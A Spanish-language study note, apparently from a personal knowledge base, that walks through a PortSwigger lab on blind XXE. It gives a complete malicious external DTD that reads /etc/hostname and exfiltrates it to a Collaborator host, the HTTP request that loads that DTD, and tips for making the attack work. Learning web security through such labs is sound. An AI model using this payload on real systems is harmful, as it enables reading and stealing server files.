---
aliases:
  - XXE ciego - exfiltrar con DTD externo
  - blind xxe exfiltration external dtd
  - malicious dtd xxe
tags:
  - vuln/xxe
  - example
  - portswigger
---

# Ejemplo — XXE ciego: exfiltrar un archivo con DTD externo ⭐

> Lab: [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

**Qué demuestra:** ciego + querés el **contenido** del archivo (no solo un ping). Hospedás un **DTD malicioso** en tu exploit server que **lee el archivo y lo manda por la URL** de tu Collaborator. Es el vector estrella del XXE ciego.

## Vector completo (3 partes)

### 1. El DTD malicioso — qué debe contener
Guardalo en el **exploit server** (Body del exploit, ver paso 2). Contenido exacto:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
Línea por línea:
- `%file` → **lee** el archivo objetivo.
- `%eval` → declara **dinámicamente** una nueva entidad `%exfil`. Necesita `&#x25;` = **`%` escapado** (una entidad no puede contener un `%` literal sin escapar).
- `%exfil` → al referenciarse, hace que el parser pida `http://COLLAB/?x=<contenido del archivo>` → **exfiltración**.
- **El orden importa:** primero `%eval;` (define `%exfil`), después `%exfil;` (lo dispara).

### 2. Hospedar el DTD en el exploit server
- **"Go to exploit server"** → en **File** poné `/exploit.dtd`, pegá el DTD de arriba en **Body**, **Store**.
- **"View exploit"** y copiá la URL → `https://EXPLOIT.exploit-server.net/exploit.dtd`.

### 3. La request que carga el DTD externo
Interceptá el "Check stock" e insertá el stub **entre `<?xml?>` y `<stockCheck>`**:
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
Burp → **Collaborator** → **Poll now** → interacciones **DNS + HTTP**. La request **HTTP** trae el contenido del archivo en el parámetro `?x=…`.

## Detalles que se pasan por alto
- **Por qué DTD externo y no interno:** las entidades de parámetro que se referencian *dentro de otra declaración de entidad* (`%eval`) **no** están permitidas en el subset interno del DOCTYPE. Por eso el bloque va **hospedado afuera** y lo cargás con `%xxe;`.
- **`&#x25;` es obligatorio** (es `%`). Sin escaparlo, el DTD no parsea.
- **El archivo NO debe tener saltos de línea** para exfil por HTTP: `/etc/hostname` (una línea) funciona; **`/etc/passwd` rompe la URL** (multilínea) → usá **error-based** ([[vulnerabilities/006-xxe/examples/xxe-ciego-error-based-con-dtd-externo|error-based]]) o **variante FTP** (`ftp://` en vez de `http://`).
- **Content-Type de la request = `application/xml`.** El del `.dtd` hospedado no es crítico (el parser lo trae igual), pero usá **https** en el exploit server.
- El stub va **antes** de `<stockCheck>`, nunca dentro.
